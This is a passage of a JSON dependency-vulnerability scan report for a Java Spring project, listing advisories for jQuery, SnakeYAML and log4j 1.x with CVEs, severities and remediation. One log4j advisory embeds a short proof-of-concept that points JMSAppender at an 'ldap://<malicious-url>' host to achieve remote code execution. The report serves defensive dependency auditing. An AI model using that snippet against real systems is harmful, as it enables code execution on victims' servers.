      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-565171",
      "identifiers": {
        "CVE": [
          "CVE-2020-11023"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-jpcq-cgw6-v4j6"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jquery",
        "groupId": "org.webjars"
      },
      "modificationTime": "2022-02-23T15:25:00.361296Z",
      "moduleName": "org.webjars:jquery",
      "packageManager": "maven",
      "packageName": "org.webjars:jquery",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-13T15:33:49Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77"
        },
        {
          "title": "PoC",
          "url": "https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html"
        },
        {
          "title": "Release Notes",
          "url": "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/"
        },
        {
          "title": "Security Blog",
          "url": "https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html?spref=tw"
        }
      ],
      "semver": {
        "vulnerable": [
          "[1.0.3, 3.5.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6",
        "org.webjars:jquery@1.11.1"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@4.5.0",
        "org.webjars:jquery@3.5.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:jquery",
      "version": "1.11.1"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:P/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2020-04-30T12:44:35.310432Z",
      "credit": [
        "Masato Kinugawa"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n\n[org.webjars:jquery](https://www.npmjs.com/package/jquery) is a JavaScript library. It makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS).\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html(), .append()`, and others) may execute untrusted code.\n\n\n## Details:\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n\n## Remediation\n\nUpgrade `org.webjars:jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GHSA](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [JQuery 3.5.0 Release](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [JQuery Upgrade Guide](https://jquery.com/upgrade-guide/3.5/)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Security Blog](https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html)\n",
      "disclosureTime": "2020-04-29T23:02:09Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "3.5.0"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-567882",
      "identifiers": {
        "CVE": [
          "CVE-2020-11022"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-gxr4-xjj5-5px2",
          "GHSA-v73w-r9xg-7cr9"
        ],
        "NSP": [
          "1518"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jquery",
        "groupId": "org.webjars"
      },
      "modificationTime": "2022-02-23T15:25:00.383036Z",
      "moduleName": "org.webjars:jquery",
      "packageManager": "maven",
      "packageName": "org.webjars:jquery",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-29T23:02:09Z",
      "references": [
        {
          "title": "GHSA",
          "url": "https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77"
        },
        {
          "title": "JQuery 3.5.0 Release",
          "url": "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/"
        },
        {
          "title": "JQuery Upgrade Guide",
          "url": "https://jquery.com/upgrade-guide/3.5/"
        },
        {
          "title": "PoC",
          "url": "https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html"
        },
        {
          "title": "Security Blog",
          "url": "https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[1.2.0 ,3.5.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6",
        "org.webjars:jquery@1.11.1"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@4.5.0",
        "org.webjars:jquery@3.5.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:jquery",
      "version": "1.11.1"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L/E:P/RL:T/RC:U",
      "alternativeIds": [],
      "creationTime": "2019-12-12T13:08:53.753033Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.4,
      "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The Alias feature in SnakeYAML 1.18 allows entity expansion during a load operation, a related issue to CVE-2003-1564.\r\n\r\n*Note* While the Maintainer acknowledges the existence of the issue, they believe it should be solved by sanitizing the `inputStream` to the parser\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.26 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/asomov/snakeyaml/commits/da11ddbd91c1f8392ea932b37fa48110fa54ed8c)\n- [Maintainer Report](https://bitbucket.org/asomov/snakeyaml/wiki/Billion%20laughs%20attack)\n- [POC: Bitbucket Issue](https://bitbucket.org/asomov/snakeyaml/issues/377/allow-configuration-for-preventing-billion)\n- [Proof Of Concept](https://bitbucket.org/asomov/snakeyaml/commits/04378d05777d21d114a9cdc24976ad49c8919222)\n",
      "disclosureTime": "2019-12-12T03:28:21Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "1.26"
      ],
      "functions": [
        {
          "functionId": {
            "className": "Composer",
            "filePath": "org/yaml/snakeyaml/composer/Composer.java",
            "functionName": "composeNode"
          },
          "version": [
            "[,1.26)"
          ]
        },
        {
          "functionId": {
            "className": "BaseConstructor",
            "filePath": "org/yaml/snakeyaml/constructor/BaseConstructor.java",
            "functionName": "constructMapping2ndStep"
          },
          "version": [
            "[,1.26)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.yaml.snakeyaml.composer.Composer",
            "functionName": "composeNode"
          },
          "version": [
            "[,1.26)"
          ]
        },
        {
          "functionId": {
            "className": "org.yaml.snakeyaml.constructor.BaseConstructor",
            "functionName": "constructMapping2ndStep"
          },
          "version": [
            "[,1.26)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGYAML-537645",
      "identifiers": {
        "CVE": [
          "CVE-2017-18640"
        ],
        "CWE": [
          "CWE-189"
        ],
        "GHSA": [
          "GHSA-rvwf-54qp-4r6v"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "snakeyaml",
        "groupId": "org.yaml"
      },
      "modificationTime": "2021-09-24T13:25:49.022190Z",
      "moduleName": "org.yaml:snakeyaml",
      "packageManager": "maven",
      "packageName": "org.yaml:snakeyaml",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-12-19T03:28:21Z",
      "references": [
        {
          "title": "Bitbucket Commit",
          "url": "https://bitbucket.org/asomov/snakeyaml/commits/da11ddbd91c1f8392ea932b37fa48110fa54ed8c"
        },
        {
          "title": "Maintainer Report",
          "url": "https://bitbucket.org/asomov/snakeyaml/wiki/Billion%20laughs%20attack"
        },
        {
          "title": "POC: Bitbucket Issue",
          "url": "https://bitbucket.org/asomov/snakeyaml/issues/377/allow-configuration-for-preventing-billion"
        },
        {
          "title": "Proof Of Concept",
          "url": "https://bitbucket.org/asomov/snakeyaml/commits/04378d05777d21d114a9cdc24976ad49c8919222"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.26)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.yaml:snakeyaml@1.16"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.3.0.RELEASE",
        "org.springframework.boot:spring-boot-starter@2.3.0.RELEASE",
        "org.yaml:snakeyaml@1.26"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.yaml:snakeyaml",
      "version": "1.16"
    }
  ],
  "ok": false,
  "dependencyCount": 53,
  "org": "anhvanyeu1998",
  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.22.1\nignore: {}\npatch: {}\n",
  "isPrivate": true,
  "licensesPolicy": {
    "severities": {},
    "orgLicenseRules": {
      "AGPL-1.0": {
        "licenseType": "AGPL-1.0",
        "severity": "high",
        "instructions": ""
      },
      "AGPL-3.0": {
        "licenseType": "AGPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "Artistic-1.0": {
        "licenseType": "Artistic-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "Artistic-2.0": {
        "licenseType": "Artistic-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "CDDL-1.0": {
        "licenseType": "CDDL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "CPOL-1.02": {
        "licenseType": "CPOL-1.02",
        "severity": "high",
        "instructions": ""
      },
      "EPL-1.0": {
        "licenseType": "EPL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "GPL-2.0": {
        "licenseType": "GPL-2.0",
        "severity": "high",
        "instructions": ""
      },
      "GPL-3.0": {
        "licenseType": "GPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "LGPL-2.0": {
        "licenseType": "LGPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-2.1": {
        "licenseType": "LGPL-2.1",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-3.0": {
        "licenseType": "LGPL-3.0",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-1.1": {
        "licenseType": "MPL-1.1",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-2.0": {
        "licenseType": "MPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "MS-RL": {
        "licenseType": "MS-RL",
        "severity": "medium",
        "instructions": ""
      },
      "SimPL-2.0": {
        "licenseType": "SimPL-2.0",
        "severity": "high",
        "instructions": ""
      }
    }
  },
  "packageManager": "maven",
  "ignoreSettings": null,
  "summary": "119 vulnerable dependency paths",
  "remediation": {
    "unresolved": [
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "alternativeIds": [],
        "creationTime": "2021-06-04T15:38:41.700520Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
        "disclosureTime": "2020-04-27T17:16:14Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-1300176",
        "identifiers": {
          "CVE": [
            "CVE-2020-9488"
          ],
          "CWE": [
            "CWE-297"
          ],
          "GHSA": [
            "GHSA-vwqq-5vrc-xw9h"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-03-27T14:22:09.168396Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-04-28T17:16:14Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b"
          },
          {
            "title": "Jira Issue",
            "url": "https://issues.apache.org/jira/browse/LOG4J2-2819"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Man-in-the-Middle (MitM)",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "low"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
        "alternativeIds": [],
        "creationTime": "2021-12-13T14:52:40.887231Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 6.6,
        "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
        "disclosureTime": "2021-12-10T00:00:00Z",
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2316893",
        "identifiers": {
          "CVE": [
            "CVE-2021-4104"
          ],
          "CWE": [
            "CWE-94"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-02-15T15:25:01.031655Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2021-12-13T15:31:00Z",
        "references": [
          {
            "title": "Apache Mail",
            "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx"
          },
          {
            "title": "GitHub Comment",
            "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301"
          },
          {
            "title": "GitHub Discussion",
            "url": "https://github.com/apache/logging-log4j2/pull/608"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "medium",
        "socialTrendAlert": false,
        "title": "Arbitrary Code Execution",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "medium"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:06:29.378900Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
        "disclosureTime": "2022-01-18T17:01:37Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2342645",
        "identifiers": {
          "CVE": [
            "CVE-2022-23305"
          ],
          "CWE": [
            "CWE-89"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-03-27T14:20:21.122319Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:13:25Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": false,
        "title": "SQL Injection",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:08:37.955423Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
        "disclosureTime": "2022-01-18T17:06:32Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2342646",
        "identifiers": {
          "CVE": [
            "CVE-2022-23307"
          ],
          "CWE": [
            "CWE-502"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-03-27T14:18:24.241895Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:13:25Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "NVD Information",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "from": [
          "com.canh:JavaSpring@1.0-SNAPSHOT",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:25:51.891230Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
        "disclosureTime": "2022-01-18T17:22:50Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2342647",
        "identifiers": {
          "CVE": [
            "CVE-2022-23302"
          ],
          "CWE": [
            "CWE-502"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-03-27T14:15:25.880692Z",
        "moduleName": "log4j:log4j",
